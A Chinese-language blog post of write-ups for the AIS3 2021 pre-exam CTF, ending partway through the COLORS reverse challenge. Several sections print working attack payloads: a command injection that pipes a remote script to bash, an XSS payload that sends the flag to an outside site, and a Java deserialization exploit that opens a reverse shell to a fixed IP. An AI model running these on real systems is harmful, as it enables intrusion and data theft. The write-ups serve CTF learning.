---
title: AIS3-2021 Pre-exam Writeups
date: 2021-07-31 14:55:39
mathjax: true
tags:
    - ctf
---

前測終於衝上 1 開頭了
![](https://i.imgur.com/s41YkVC.png)

還三生有幸拿到首殺
![](https://i.imgur.com/fhpHqbU.png)

學了那麼久感覺自己終於有點進步 (?

<!-- more -->

另外
pre-exam 怎麼突然變難ㄌ 嗚嗚嗚
而且一次難太多了ㄅXD
還有第一名的35P也太強ㄅ 分數有夠電ㄟ

---

# Welcome

## Cat Slayer ᶠᵃᵏᵉ | Nekogoroshi

說來慚愧
我手爆wwwwwwww
因為那時候剛首殺完一題 web
於是就跑來放鬆心情了 (x
- password : `2025830455298`

- flag : `AIS3{H1n4m1z4w4_Sh0k0gun}`

---

# Web

## ⲩⲉⲧ ⲁⲛⲟⲧⲏⲉꞅ 𝓵ⲟ𝓰ⲓⲛ ⲣⲁ𝓰ⲉ

開局送 source
我們取關鍵的部分來看

```python=
FLAG = os.environ.get('FLAG', 'AIS3{TEST_FLAG}')
users_db = {
    'guest': 'guest',
    'admin': os.environ.get('PASSWORD', 'S3CR3T_P455W0RD')
}


@app.route("/")
def index():
    def valid_user(user):
        return users_db.get(user['username']) == user['password']

    if 'user_data' not in session:
        return render_template("login.html", message="Login Please :D")

    user = json.loads(session['user_data'])
    if valid_user(user):
        if user['showflag'] == True and user['username'] != 'guest':
            return FLAG
        else:
            return render_template("welcome.html", username=user['username'])

    return render_template("login.html", message="Verify Failed :(")


@app.route("/login", methods=['POST'])
def login():
    data = '{"showflag": false, "username": "%s", "password": "%s"}' % (
        request.form["username"], request.form['password']
    )
    session['user_data'] = data
    return redirect("/")
```

1. 從上面可以發現我們輸入的帳號密碼被放進 `json` 裡面轉成 `dict`
    然後被送去跟一個寫死的 `user_db` 驗證帳號密碼
    也因為不存在 leak `admin` 密碼的方法
    所以要偽造 `admin` 登入是不可能的
    而且看到 \#18 要我們讓 `showflag` 等於 `true`
    這時候第一個出現的想法就是 json 覆蓋
2. 在有了上面的條件後
    接著需要讓登入的使用者不為 `guest` 卻又要過 \#11 的等式
    可是又弄不到 `admin` 的密碼阿
    所以轉念一想如果是一個不存在 `user_db` 中的使用者登入呢?
    結果還真被我矇到 `dict.get()` 在查詢不到鍵值時會回傳 `None`
    再來就好辦了 因為 `json` 構造 `null` 轉成 python 的型態就會變成 `None`
3. 最終就構造出 payload 送上去
    - username=` `
    - password=`","showflag":true,"password":null,"username":"chess`

- flag : `AIS3{/r/badUIbattles?!?!}`

## HaaS

這題的考點我有點不是很清楚
所以我覺得解法有點通靈XD

總之網站功能是要你輸入一個網址
然去會去幫你檢查該網址服務是否活著
一看就是 SSRF 的樣子
所以就丟了個 `127.0.0.1` 果真被 ban
於是就繞過它

繞完後發現它只告訴你活著 就這樣 沒然後了
這時候就很問號
於是到處看看發現 input 其實還有一個隱藏欄位 `status`
看那個樣子是 http return code
剛好它的 response 中也還有另一個 return code
於是猜是不是要兩個不同
果真一改就噴出 flag 了

- payload : 
    ```
    curl -X POST -d "url=http://127.0.1.1&status=666" "http://quiz.ais3.org:7122/haas"
    ```

- flag : `AIS3{V3rY_v3rY_V3ry_345Y_55rF}`

## 【5/22 重要公告】

首殺題，整個心情愉悅
這題的流程

從網址的長相可以發現可能存在 LFI
`http://quiz.ais3.org:8001/?module=modules/home`
然後尾巴應該是 `.php` 本身就寫死在 code 裡面了
所以就把已知的東西撈出來看一看
`http://quiz.ais3.org:8001/?module=php://filter/read=covert.base64-encode/resource=index`

`index.php` 沒什麼東西
只知道 `GET['modules']` 沒東西的話
預設會去 include `modules/home.php`
但 `home.php` 沒什麼值得看的 都是 html 而已
只知道它會去 fetch `modules/api.php`

- module/api.php
```php=
<?php
header('Content-Type: application/json');

include "config.php";
$db = new SQLite3(SQLITE_DB_PATH);

if (isset($_GET['id'])) {
    $data = $db->querySingle("SELECT name, host, port FROM challenges WHERE id=${_GET['id']}", true);
    $host = str_replace(' ', '', $data['host']);
    $port = (int) $data['port'];
    $data['alive'] = strstr(shell_exec("timeout 1 nc -vz '$host' $port 2>&1"), "succeeded") !== FALSE;
    echo json_encode($data);
} else {
    $json_resp = [];
    $query_res = $db->query("SELECT * FROM challenges");
    while ($row = $query_res->fetchArray(SQLITE3_ASSOC)) $json_resp[] = $row;
    echo json_encode($json_resp);
}
```

看到這份檔案就是關鍵了
從 code 可以知道 sql query 出來的 `host` 欄位會被放進 `shell_exec` 去當作參數執行
因此最直觀就是 sqlite injection + command injection

- payload :
    ```
    http://quiz.ais3.org:8001/?module=modules/api&id=0 union select 1,"chesskuo.tw'$(curl${IFS}sh.chesskuo.tw|bash)'",80
    ```

直接上 payload
一個關鍵點
空白會被取代掉 因此需要用 `${IFS}` 繞一下
然後我的作法是打一個 reverse shell 到我的 server 上

- flag : `AIS3{o1d_skew1_w3b_tr1cks_co11ect10n_:D}`


## XSS Me

這題主要考點就是你知不知道 網址的 `#` 後面的東西不會被當作網址 or 參數解析
還有在網址直接輸入 `javascript:alert()` 其實也可以直接執行 js
綜合以上兩點
直接看 payload 應該就懂了

- payload :
    ```
    http://quiz.ais3.org:8003/?type=error&message=</script><script>location=location.hash.slice(1)//#javascript:fetch('/getflag').then(function(r){return/**/r.text()}).then(function(r){location='//chesskuo.tw/'+r})
    ```
- flag : `AIS3{XSS_K!NG}`

## Cat Slayer ᴵⁿᵛᵉʳˢᵉ

首先大家先記得這個網站 [記住我](http://www.jackson-t.ca/runtime-exec-payloads.html)
太重要了

> 我因為 getRuntime.exec payload 湊不出來又不知道有工具就被踢到第 12 名
> 我就爛
> [name=chess]

這題 wp 邊打邊流淚
真的會哭死
臨門一腳

直接說結論 這題是 java deserialization
可以參考[這篇](https://xz.aliyun.com/t/6787)教學
你會發現底下講到的反射型的串接方式
在 `maou/WEB-INF/classes/com/cat/Maou.class` 的 `readObject()` 中有非常相似的函數存在 (應該說你要的東西都有了
照著 code 的結構一步一步串回來就好

這邊附上我修改過的幾個檔案

- Maou.java
```java=
package com.cat;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.io.*; 

public class Maou implements Serializable {
    String CAT_NAME_SETTER = "exec";
    String[] DEMON_NAMES = {"bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwOC42MS4xNjMuMTE1LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i} #"};
    ArrayList<Object> cats = new ArrayList<>();
    String name = "(unnamed)";

    public Maou(String name2) {
        this.name = name2;
    }

    public void summonCats(int num) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        String[] catTypes = {"BabyCat", "NormalCat", "SuperCat"};
        for (int i = 0; i < num; i++) {
            String type = catTypes[(int) (Math.random() * 3.0d)];
            this.cats.add(Class.forName("java.lang.Runtime"));
        }
    }

    public String getName() {
        return this.name;
    }

    public ArrayList<Object> getCats() {
        return this.cats;
    }

    private String genCatName() {
        return this.DEMON_NAMES[(int) (Math.random() * ((double) this.DEMON_NAMES.length))];
    }

    private void writeObject(ObjectOutputStream stream) throws IOException {
        stream.writeObject(this.DEMON_NAMES);
        stream.writeObject(this.CAT_NAME_SETTER);
        stream.writeObject(this.name);
        ArrayList<String> catsClass = new ArrayList<>();
        Iterator<Object> it = this.cats.iterator();
        catsClass.add("java.lang.Runtime");
        // while (it.hasNext()) {
        //     catsClass.add("java.lang.Runtime");
        // }
        stream.writeObject(catsClass);
    }

    private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        this.DEMON_NAMES = (String[]) stream.readObject();
        this.CAT_NAME_SETTER = (String) stream.readObject();
        this.name = (String) stream.readObject();
        this.cats = new ArrayList<>();
        Iterator<String> it = ((ArrayList) stream.readObject()).iterator();
        while (it.hasNext()) {
            String catCls = it.next();
            String[] parts = catCls.split("\\.");
            String typeName = parts[parts.length - 1];
            Class<?> cls = Class.forName(catCls);
            Method method = cls.getMethod(this.CAT_NAME_SETTER, String.class);
            Constructor constructor = cls.getDeclaredConstructor(new Class[0]);
            constructor.setAccessible(true);
            Object cat = constructor.newInstance(new Object[0]);
            Process proc = (Process) method.invoke(cat, genCatName() + "-" + typeName);
            
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            System.out.println("Here is the standard output of the command:\n");
            String s = null;
            while ((s = stdInput.readLine()) != null) { System.out.println(s); }
            System.out.println("Here is the standard error of the command (if any):\n");
            while ((s = stdError.readLine()) != null) { System.out.println(s); }

            this.cats.add((Object) cat);
        }
    }
}
```

- 用來產生 token 的 main function
```java=
import com.cat.Maou;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Test {
	public static void main(String[] args) throws Exception {
		String username = "chess";
		Maou player = new Maou(username);
		player.summonCats(1);
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		new ObjectOutputStream(bos).writeObject(player);
		String token = Base64.getEncoder().encodeToString(bos.toByteArray());
		System.out.print(token);
		// String token = "rO0ABXNyAAxjb20uY2F0Lk1hb3Uo+LGFecOJ3AMABEwAD0NBVF9OQU1FX1NFVFRFUnQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC0RFTU9OX05BTUVTdAATW0xqYXZhL2xhbmcvU3RyaW5nO0wABGNhdHN0ABVMamF2YS91dGlsL0FycmF5TGlzdDtMAARuYW1lcQB+AAF4cHVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABFjYWxjLmV4ZSAmJiBlY2hvIHQABGV4ZWN0AAVjaGVzc3NyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAARamF2YS5sYW5nLlJ1bnRpbWV4eA==";
		// new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(token))).readObject();
	}
}
```

最後的 payload 可以參考以下
我一樣是打一個 reverse shell 到我的 server 上
最後的重點其實就在如何構造出一個 `java.lang.Runtime.exec()` 可以吃的 command
還有不要忘記 Maou.java#72 那邊
command 最後會串接一段垃圾在後面 要繞過

- payload : 
	- command : `/bin/bash -i >& /dev/tcp/108.61.163.115/6666 0>&1`
	- token : `rO0ABXNyAAxjb20uY2F0Lk1hb3Uo+LGFecOJ3AMABEwAD0NBVF9OQU1FX1NFVFRFUnQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC0RFTU9OX05BTUVTdAATW0xqYXZhL2xhbmcvU3RyaW5nO0wABGNhdHN0ABVMamF2YS91dGlsL0FycmF5TGlzdDtMAARuYW1lcQB+AAF4cHVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AGtiYXNoIC1jIHtlY2hvLEwySnBiaTlpWVhOb0lDMXBJRDRtSUM5a1pYWXZkR053THpFd09DNDJNUzR4TmpNdU1URTFMelkyTmpZZ01ENG1NUT09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0gI3QABGV4ZWN0AAVjaGVzc3NyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAARamF2YS5sYW5nLlJ1bnRpbWV4eA==`

- flag : `AIS3{maou_lucifer_meowmeow}`

---

# Misc

## Microcheese

題目是 crypto 那題的簡單版
但完全沒用到 crpyto XD

- server.py
```python=
def play(game: Game):
    ai_player = AIPlayer()
    win = False

    while not game.ended():
        game.show()
        print_game_menu()
        choice = input('it\'s your turn to move! what do you choose? ').strip()

        if choice == '0':
            pile = int(input('which pile do you choose? '))
            count = int(input('how many stones do you remove? '))
            if not game.make_move(pile, count):
                print_error('that is not a valid move!')
                continue

        elif choice == '1':
            game_str = game.save()
            digest = hash.hexdigest(game_str.encode())
            print('you game has been saved! here is your saved game:')
            print(game_str + ':' + digest)
            return

        elif choice == '2':
            break

        # no move -> player wins!
        if game.ended():
            win = True
            break
        else:
            print_move('you', count, pile)
            game.show()

        # the AI plays a move
        pile, count = ai_player.get_move(game)
        assert game.make_move(pile, count)
        print_move('i', count, pile)

    if win:
        print_flag(flag)
        exit(0)
    else:
        print_lose()
```

在這段中
並沒有針對 `choice` 超過 2 的行為去做限制
因此造成只有 bot 自己在下棋的情況 而我們自己卻不用動
就這樣一直重複到我們走下一步穩贏再動作即可

這邊要注意的是
不能第一次就輸入超過 2 的選項 會噴錯
因為 #36 的地方 pile 跟 count 並未被宣告
需要先透過選項 0 生成後 才能開始使用 bug

- flag : `AIS3{5._e3_b5_6._a4_Bb4_7._Bd2_a5_8._axb5_Bxc3} `

## Blind

題目的邏輯是先把 stdout 給關閉
然後給你一個執行 syscall 的機會
之後才輸出 flag
因此照正常走我們是看不到 flag 被輸出的

這題去翻一遍 [syscall docs](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit) 就可以知道什麼能用了XD
我們的目的就是重新開啟 stdout

- dup2(0, 1)
- flag : `AIS3{dupppppqqqqqub}`

## \[震撼彈\] AIS3 官網疑遭駭！

我很喜歡這題
挺有趣的也非常重要的想法

- **偽造 DNS record**

首先我的習慣是先去看看 export object 裡面有沒有什麼好康
從成堆的紀錄裡會發現
有一堆去請求 magic.ais3.org
但是其中一個卻是 magic.ais3.org:8100

![](https://i.imgur.com/u1LU4gr.png)

接著我們可以得知 magic.ais3.org 是指向 ip 10.153.11.126
因此直接去網站上看看
80 port 沒反應
但 8100 卻給了個 nginx 的預設頁面

看到這邊第一個想法就是
該不會認 domain route 頁面ㄅ
於是輸入 magic.ais3.org:8100 在網址上
卻得到回應 domain 不存在

事情好啦 我們又沒有 ais3.org 的管理權限
那要怎麼辦呢

這時候就要善用每一台電腦自己本身的 DNS 解析
針對 OS 不同 個別存在一份檔案來管理本機解析 DNS

- windows : `C:\Windows\System32\drivers\etc\hosts`
- linux : `/etc/hosts`

在檔案裡面自己指定一下

```hosts=
10.153.11.126 magic.ais3.org
```

接著你就拿到一個 web shell 了
後面跟著的參數是 base64 後 reverse 的字串

![](https://i.imgur.com/2sTh0dC.png)

- flag : `AIS3{0h!Why_do_U_kn0w_this_sh3ll1!1l!}`

---

# Crypto

## Microchip

邏輯逆推
寫code爆破

- exp.py
```python=
flag = 'AIS3'

with open('output.txt', 'r') as f:
	result = f.read().split(': ')[1].strip()

keys = list()

for i in range(0, 4):
	num = ord(flag[i]) - 32
	num2 = ord(result[3 - i]) - 32
	keys.append(num2 + 96 - num)

flag = ''
for i in range(0, len(result), 4):
	for j in range(4):
		num = ord(result[i + 3 - j]) - 32
		num = num + 96 - keys[j]
		if num < 0:
			num %= 96
		num = num + 32
		if num > 128:
			num %= 96
		flag += chr(num)

print(flag)
```

- flag : `AIS3{w31c0me_t0_AIS3_cryptoO0O0o0Ooo0}`

## ReSident evil villAge

給 server 一個字串會用 d 去加密給你
也可以丟加密的字串過去解密出原始字串

要拿到 flag 需解密出 `Ethan Winters`
但又不能拿 `Ethan Winters` 去加密

這時候就要利用到 RSA 的數學推導

假設 $x$ 為我們需要的字串 (也就是 `Ethan Winters`)
因此我們想要得到 $x$ 加密後的結果 就是 $x^d$

送 2x 過去加密會得到 $f_1 = (2x)^d mod N$
送 4x 過去加密會得到 $f_2 = (4x)^d mod N$
這邊假設 N 超大 所以以下都忽略 %N

$\frac{f_2}{f_1} = \frac{4^d * x^d}{2^d * x^d} = 2^d$

$\frac{f_1}{2^d} = x^d$

接著得到的 $2^d$ 就丟給 server 去解密就可拿到 flag 了
以下是我的腳本 可能有點醜XD
- exp.py
```python=
from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long

host = 'quiz.ais3.org'
port = 42069
r = remote(host, port)

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    g, y, x = egcd(b%a,a)
    return (g, x - (b//a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('No modular inverse')
    return x%m

name = b'Ethan Winters'
name_int = bytes_to_long(name)

# init
r.recvuntil('Welcome to ReSident evil villAge, sign the name "Ethan Winters" to get the flag.\n')
n = int(r.recvlineS().split(' = ')[1].strip())
e = int(r.recvlineS().split(' = ')[1].strip())

# input = 2x
r.recvuntil('1) sign\n2) verify\n3) exit\n')
r.sendline('1')
r.recvuntil('Name (in hex): ')
tmp = hex(name_int * 2)
tmp = tmp[2:] if len(tmp) % 2 == 0 else '0' + tmp[2:]
r.sendline(tmp)
hash1 = int(r.recvlineS().split(' ')[1].strip())

# input = 4x
r.recvuntil('1) sign\n2) verify\n3) exit\n')
r.sendline('1')
r.recvuntil('Name (in hex): ')
tmp = hex(name_int * 4)
tmp = tmp[2:] if len(tmp) % 2 == 0 else '0' + tmp[2:]
r.sendline(tmp)
hash2 = int(r.recvlineS().split(' ')[1].strip())

# hash2 / hash1 = 2^d
ans = hash2 * modinv(hash1, n)
# hash1 / 2^d = x^d
ans = hash1 * modinv(ans, n)

# send answer
r.recvuntil('1) sign\n2) verify\n3) exit\n')
r.sendline('2')
r.recvuntil('Signature: ')
r.sendline(str(ans))
print(r.recvlineS())
```

- flag : `AIS3{R3M383R_70_HAsh_7h3_M3Ssa93_83F0r3_S19N1N9}`

## Republic of South Africa

給的那份 code
一開始以為是一個自幹的 RSA
但那公式總覺得在哪看過

不過不管 先跑看看
發現它生 p q 的 keygen 太大好像電腦就跑不動ㄌ
就改個很小測試看看

一次還好
多給幾個不同數字就發現它好像會生出圓周率...
而且數字給多少就給幾位的圓周率

於是就大膽假設它那個預設是 153 位的圓周率
上網稍微複製貼上就有了 我才不要等它慢慢算

接著就是爆破 p q
這邊我是用 binary search 下去搜

- exp.py
```python=
import math

with open('output.txt', 'r') as f:
	ls = f.readlines()
	n = int(ls[0].split(' = ')[1].strip())
	e = int(ls[1].split(' = ')[1].strip())
	c = int(ls[2].split(' = ')[1].strip())

# p + q
count = 314159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848

def egcd(a, b):
	if a == 0:
		return (b, 0, 1)
	g, y, x = egcd(b%a,a)
	return (g, x - (b//a) * y, y)

def modinv(a, m):
	g, x, y = egcd(a, m)
	if g != 1:
		raise Exception('No modular inverse')
	return x%m

def binSearch():
	l = 0
	r = count
	while l <= r:
		m = (l + r) // 2
		tmp = n // m
		if m + tmp < count:
			l = m + 1
		elif m + tmp > count:
			r = m
		else:
			return m
	print('Not found!')
	return

if __name__ == '__main__':
	p = binSearch()
	q = n // p
	phi = (p-1)*(q-1)
	d = modinv(e, phi)
	pt = pow(c, d, n)
	flag = bytes.fromhex(hex(pt)[2:])
	print(flag)
```

flag 出來後有個連結
就是上面那條公式的推導
我一直覺得好像在哪看過
原來是高中物理的碰撞公式阿...

- flag : `AIS3{https://www.youtube.com/watch?v=jsYwFizhncE}`

---

# Reverse

## Piano

一個 .net 的程式
丟 dnspy 看一下就找到關鍵了
根據彈的琴鍵有一個特別的順序
按對了就會噴 flag

直接寫一個逆推的腳本

- exp.py
```python=
l1 = [14, 17, 20, 21, 22, 21, 19, 18, 12, 6, 11, 16, 15, 14]
l2 = [0, -3, 0, -1, 0, 1, 1, 0, 6, 0, -5, 0, 1, 0]
l = [70, 78, 89, 57, 112, 60, 125, 96, 103, 104, 50, 109, 87, 115, 112, 54, 100, 97, 103, 56, 85, 101, 56, 119, 119, 100, 59, 88, 50, 48, 62, 120, 84, 58, 100, 86, 74, 92, 54, 96, 60, 117, 119, 122]

note = list()
for i in range(14):
	note.append((l1[i] + l2[i]) // 2)

flag = ''
for i in range(len(l)):
	c = chr(l[i] ^ note[i % 14])
	flag += c

print(flag)
```

- flag : `AIS3{7wink1e_tw1nkl3_l1ttl3_574r_1n_C_5h4rp}`

## 🐰 Peekora 🥒

滑倒 peko

這題是一個 python pickle bytecode
用個內建的工具去翻成人看的懂的東西

```python=
import pickle
import pickletools

b = open('flag_checker.pkl', 'rb').read()
pickletools.dis(b)
```

然後稍微照順序整理一下邏輯
```
startswith == 'AIS3{'
endswith == '}'
6 == 'A'
9 == 'j'
9 ??
11 == 'p'
9 == 14 *
1 ??
5 == 'd'
10 == 'z'
12 == 'h'
1 == 13 *
8 == 'w'
7 == 'm'
```

- flag : `AIS3{dAmwjzphIj}`

## COLORS

有一個混淆過的 js
先用 [JS NICE](http://jsnice.org/) 解混淆
接著開始 parse 裡面的東西
稍微整理一下變這樣

- encode.js
```javascript=
'use strict';
const arr = ["repeat", "1YqKovX", "NDBCMjBnMzBpNTFKNjA2MDFcMzB3NDAxMzBBNDFqNDBcNDExMzBnNzB1MzBpMTBrMzBsNDA3NjB4NTBpNTBYMTBLMTBJNDBoNTBYMDBLNDFpNTFsNzA2NzBmNDBvMTA2NTA1NzBLMTFuNTE4NzA3NDFCNTAtMTE4NDB3MzFhMTByNDF6NzBLMzA9MjA9MTA9", "substr", "output", "getElementsByTagName", "65022JgPEZp", "keydown", "length", "innerHTML", "677PRUQAU", "ArrowLeft", "QWxTM3tCYXNFNjRfaTUrYjByTkluZ35cUXdvLy14SDhXekNqN3ZGRDJleVZrdHFPTDFHaEtZdWZtWmRKcFg5fQ==", "133781JKLWBV", "ArrowUp", "90407czXCgh", "PGRpdiBzdHlsZT0id2lkdGg6IDM1MHB4OyBwb3NpdGlvbjogYWJzb2x1dGU7IGJvdHRvbTogMHB4OyBsZWZ0OiAwcHg7Ij48ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7IGFuaW1hdGlvbjogcmFpbmJvdyAycyBsaW5lYXIgMHMgaW5maW5pdGUgbm9ybWFsOyBwb3NpdGlvbjogYWJzb2x1dGU7IHRvcDogLTEwcHg7IGxlZnQ6IDUwJTsgZm9udC1zaXplOiAyMHB4OyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoLTUwJSk7IHdpZHRoOiAzNTBweDsiPkhlcmUgaXMgeW91cjxicj4iZW5jb2RlZCIgZmxhZyw8YnI+aW5wdXQgdG8gZW5jb2RlIHNvbWV0aGluZyBlbHNlITwvZGl2PiA8c3ZnIGlkPSLwn5CIIiB4PSIwcHgiIHk9IjBweCIgdmlld0JveD0iMCAwIDEyOCAxMjgiIHN0cm9rZT0iIzAwMCIgc3Ryb2tlLXdpZHRoPSIzIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPjxwYXRoIGlkPSJib2R5Ij48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJmaWxsIiBkdXI9IjUwMG1zIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIga2V5VGltZXM9IjA7MC4xOzAuMjswLjM7MC40OzAuNTswLjY7MC43OzAuODswLjk7MSIgdmFsdWVzPSIgI2ZmOGQ4YjsgI2ZlZDY4OTsgIzg4ZmY4OTsgIzg3ZmZmZjsgIzhiYjVmZTsgI2Q3OGNmZjsgI2ZmOGNmZjsgI2ZmNjhmNzsgI2ZlNmNiNzsgI2ZmNjk2ODsgI2ZmOGQ4YiAiPjwvYW5pbWF0ZT48YW5pbWF0ZSBhdHRyaWJ1dGVOYW1lPSJkIiBkdXI9IjUwMG1zIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIga2V5VGltZXM9IjA7MC4xOzAuMjswLjM7MC40OzAuNTswLjY7MC43OzAuODswLjk7MSIgdmFsdWVzPSIgTTY3LjEsMTA5LjVjLTkuNiwwLTIzLjYtOC44LTIzLjYtMjRjMC0xMi4xLDE3LjgtNDEsMzcuNS00MWMxNS42LDAsMjMuMywxMC42LDI1LjEsMjAuNSBjMS45LDEwLjcsMy45LDguMiwzLjksMTkuNWMwLDguMi0zLjgsMTctMy44LDIyLjNjMCwzLjksMS40LDcuNCwyLjksMTAuNWMxLjcsMy41LDIuNCw2LjYsMi40LDkuMkg5LjVjMC0xMy43LDEwLjgtMTQsMjEuMS0yMyBjNS42LTQuOSwxMS0xMi40LDE0LjUtMjY7IE01Ni4xLDEwNy41Yy05LjYsMC0yNC42LTEzLjgtMjQuNi0yOWMwLTE2LjIsMTMtNDIsMzMuNS00MmMxNy44LDAsMjIuMywxMS42LDI2LjEsMjIuNSBjMy42LDEwLjMsOS45LDkuMiw5LjksMjAuNWMwLDguMi0xLjgsNy0xLjgsMTIuM2MwLDQuNSwzLjQsOC4yLDYuNCwxNC4xYzIuNSw0LjgsNC44LDExLjIsNC44LDIwLjZoLTk5YzAtMTIuMSw3LjItMTcuNiwxNC43LTI0LjMgYzMuMi0yLjksNi41LTUuOSw5LjItOS44OyBNNDUuMSwxMDkuNWMtNS41LTAuMi0yNy42LTguNC0yNy42LTI3YzAtMTcuOSwxNC44LTQyLDMyLjUtNDJjMTUuNCwwLDI0LDEwLjQsMjYuMSwyMS41IGMxLjMsNi43LDkuOSw5LjgsOS45LDIxLjVjMCw4LjItMC44LDYtMC44LDExLjNjMCw3LjcsMTIuOCw5LDIwLjgsMTVjNy43LDUuOCwxNS41LDE2LjcsMTUuNSwxNi43aC0xMTBjMC00LjgsMS43LTExLjMsNS0xNiBjMy4yLTQuNSw0LjUtOC4zLDUtMTU7IE0zNiwxMjBjLTUuNS0wLjItMjguNS0xMS45LTI4LjUtMzAuNWMwLTE2LjIsMTIuNS00MiwzMy00MmMxNy44LDAsMjEuOCw5LjYsMjUuNiwyMC41IEM2OS43LDc4LjMsNzYsNzguMiw3Niw4OS41YzAsOC4yLTAuOCw0LTAuOCw5LjNjMCw1LjksMTYuNSw3LjgsMjguNCwxNS45YzgsNS41LDE3LjksMTEuOCwxNy45LDExLjhoLTExMGMwLTIuMS0xLjItNS4yLTEuOS0xNC41IGMtMC4zLTMuNi0wLjUtOC4xLTAuNS0xMy45OyBNMzcsMTE5LjVjLTE1LDAuMS0zMy41LTEyLjctMzMuNS0zMEMzLjUsNzMuMywxNiw0NywzNi41LDQ3YzE3LjgsMCwyMi44LDExLDI2LDIyIEM2NS42LDc5LjQsNzMsNzkuMiw3Myw5MC41YzAsNC0xLjgsNi42LTEuOCw4LjNjMCw1LjksMTQuMiw2LjQsMjYuNCwxNS45YzcuNyw2LDEzLjksMTEuOCwxMy45LDExLjhINy41Yy0xLjItMy40LTEuOC03LjMtMS45LTExLjIgYy0wLjItNS4xLDAuMy0xMC4xLDAuOS0xMy43OyBNNDAuNSwxMjEuNWMtMTIuNiwwLTMwLTEzLjQtMzAtMjlDMTAuNSw3Ni4zLDIzLDUzLDQzLjUsNTNjMTQuNSwwLDIyLjgsOS42LDI1LDIyIGMxLjIsNi45LDEwLDkuMiwxMCwyMC41YzAsNCwwLDUuNiwwLDcuM2MwLDQuOSw2LjEsNy41LDExLjIsMTEuOWM1LjgsNSw3LjIsMTEuOCw3LjIsMTEuOEg4LjVjMC0xLjUtMC42LTYuMSwwLjQtMTEuOCBjMC42LTMuNSwxLjktNy41LDQuMy0xMS42OyBNNDguNSwxMjEuNWMtMTIuNiwwLTI1LTYuMy0yNS0xOGMwLTE2LjIsMTMuNy00NywzNi00N2MxNS42LDAsMjQuOCw5LjEsMjcsMjEuNSBjMS4yLDYuOSw3LDkuMiw3LDE4LjVjMCw5LjUtNCwxMS00LDIyYzAsNC4xLDAuNSw1LDEsNmMwLjUsMS4yLDEsMiwxLDJoLTgxYzAtNS4zLDMuMS04LjMsNi4zLTExLjVjMi42LTIuNiw1LjQtNS4zLDYuNy05LjU7IE02OC41LDEyMS41Yy0xMi42LDAtMzMtNS44LTMzLTIzYzAtOS4yLDExLjgtMzYsMzctMzZjMTUuNiwwLDI1LjgsOC4xLDI4LDIwLjUgYzEuMiw2LjksNCw2LjIsNCwxNS41YzAsOS41LTUsMTUuMS01LDIxYzAsMS45LDEsMi4zLDEsNWMwLDEuMiwwLDIsMCwyaC05MWMwLjUtNy42LDcuMS0xMS4xLDEzLjctMTUuN2M0LjktMy40LDkuOS03LjUsMTIuMy0xNC4zOyBNNzMuNSwxMTcuNWMtMTIuNiwwLTMwLTYuMi0zMC0yNWMwLTE0LjIsMjAuOS0zNywzOC0zN2MxNy42LDAsMjUuOCwxMS4xLDI4LDIzLjUgYzEuMiw2LjksMyw3LjIsMywxNi41YzAsMTIuMS02LDE2LjEtNiwyMmMwLDQuMiwyLDUuMywyLDhjMCwxLjIsMCwxLDAsMUg3LjVjMi4xLTkuNCwxMC40LTEzLjMsMTkuMi0xOS40IGM3LjEtNSwxNC40LTExLjUsMTguOC0yMy42OyBNODAuNSwxMTUuNWMtMTIuNiwwLTMyLTkuMi0zMi0yOGMwLTE0LjIsMjIuOS0zNSw0MC0zNWMxNy42LDAsMjUuOCwxMi4xLDI4LDI0LjUgYzEuMiw2LjksMyw2LjIsMywxNS41YzAsMTIuMS02LDE5LjEtNiwyNWMwLDQuMiwyLDUuMywyLDhjMCwxLjIsMCwxLDAsMWgtMTAyYzIuMy04LjcsMTEuNi0xMS43LDIwLjgtMjAuMSBjNS4zLTQuOCwxMC41LTExLjQsMTQuMi0yMS45OyBNNjcuMSwxMDkuNWMtOS42LDAtMjMuNi04LjgtMjMuNi0yNGMwLTEyLjEsMTcuOC00MSwzNy41LTQxYzE1LjYsMCwyMy4zLDEwLjYsMjUuMSwyMC41IGMxLjksMTAuNywzLjksOC4yLDMuOSwxOS41YzAsOC4yLTMuOCwxNy0zLjgsMjIuM2MwLDMuOSwxLjQsNy40LDIuOSwxMC41YzEuNywzLjUsMi40LDYuNiwyLjQsOS4ySDkuNWMwLTEzLjcsM